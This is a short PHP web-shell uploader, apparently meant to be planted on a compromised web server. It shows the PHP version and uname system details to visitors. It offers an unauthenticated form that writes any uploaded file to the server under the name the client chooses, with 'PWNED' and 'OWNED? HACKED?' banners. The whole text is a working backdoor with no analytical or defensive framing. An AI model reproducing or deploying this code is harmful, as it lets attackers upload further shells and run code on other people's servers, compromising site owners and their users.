echo "<style>@import url('https://fonts.googleapis.com/css2?family=Gloria+Hallelujah&display=swap');body{font-size:0;overflow:hidden;}h1{font-size:15px;font-family:Gloria Hallelujah;font-weight:900;}a:link{text-decoration:none;}.blink{animation:blinker 1s linear infinite;}@keyframes blinker{50%{opacity:0;}}input::file-selector-button{border: 0px solid black;border-radius: 3px;background:#606060;font-family:Gloria Hallelujah;font-weight:900;color:#f0f0f0;}input[type=submit]{border: 0px solid black;border-radius:3px;background:#606060;font-family:Gloria Hallelujah;font-weight:900;color:#f0f0f0;}input[type=file]{border: 0px solid black;border-radius: 3px;background:#f0f0f0;font-family:Gloria Hallelujah;font-weight:900;color:#000;}input::file-selector-button:hover{background:#909090;color:#000;}input[type=submit]:hover{background:#FF0000;}</style>";
echo "<h1 style='text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;'>";
echo "<hr style='border: 1px solid black;border-radius:10px'/>BYPASS UPLOAD? OWNED? PWNED? HACKED? IM LAMMER? YES :V<hr style='border: 1px solid black;border-radius:10px'/>";
echo "PHP version: " . phpversion() . "<br>" . php_uname() . "<p>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='upl'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	$rooterror = $_FILES['upl']['name'];
    if(@copy($_FILES['upl']['tmp_name'], $rooterror)) {
    echo "PWNED <a href='$rooterror'><font color='red' class='blink'>OK-Click!</a>";
    } else {
    echo "FAIL!";
    }
}
echo "</font></h1>";
